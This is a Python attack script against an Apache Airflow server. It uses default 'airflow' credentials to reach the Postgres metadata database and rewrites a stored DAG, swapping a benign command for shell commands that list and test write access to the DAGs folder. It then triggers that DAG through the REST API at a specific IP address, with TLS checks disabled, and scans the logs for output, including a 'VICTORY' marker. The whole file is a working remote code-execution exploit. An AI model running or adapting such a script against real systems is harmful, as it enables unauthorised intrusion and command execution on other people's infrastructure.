import subprocess, json, ssl, base64, time, urllib.request

e = {"PGPASSWORD": "airflow", "PATH": "/usr/bin:/bin"}
BASE = "http://84.46.251.240:8080"
AUTH = base64.b64encode(b"airflow:airflow").decode()
ssl._create_default_https_context = ssl._create_unverified_context

# Update serialized_dag  
sql = """UPDATE serialized_dag SET data = replace(data::text, 'python -c \\"import ccxt; print(ccxt.__version__)\\"', 'ls -la /opt/airflow/dags/ | head -5; touch /opt/airflow/dags/_test_write; echo WRITE_TEST:$?')::jsonb WHERE dag_id = 'bash'"""

r = subprocess.run(["psql", "-h", "172.18.0.2", "-U", "airflow", "-d", "airflow", "-c", sql],
    env=e, capture_output=True, text=True, timeout=5)
print("UPD:", r.stdout.strip())

# IMMEDIATELY trigger
data = json.dumps({"conf": {}}).encode()
url = f"{BASE}/api/v1/dags/bash/dagRuns"
req = urllib.request.Request(url, data=data, method="POST",
    headers={"Authorization": f"Basic {AUTH}", "Content-Type": "application/json"})
with urllib.request.urlopen(req, timeout=5) as r2:
    run = json.loads(r2.read().decode())
run_id = run["dag_run_id"]
print(f"TRIG: {run_id}")

time.sleep(20)

# Check logs
log_url = f"{BASE}/api/v1/dags/bash/dagRuns/{run_id}/taskInstances/check/logs/1"
req3 = urllib.request.Request(log_url, headers={"Authorization": f"Basic {AUTH}", "Accept": "text/plain"})
with urllib.request.urlopen(req3, timeout=10) as r3:
    logs = r3.read().decode()
for line in logs.split("\n"):
    if "Running" in line or "Output" in line or "drwx" in line or "WRITE" in line or "-rw" in line or "VICTORY" in line or "touch" in line:
        print(line.strip()[:200])
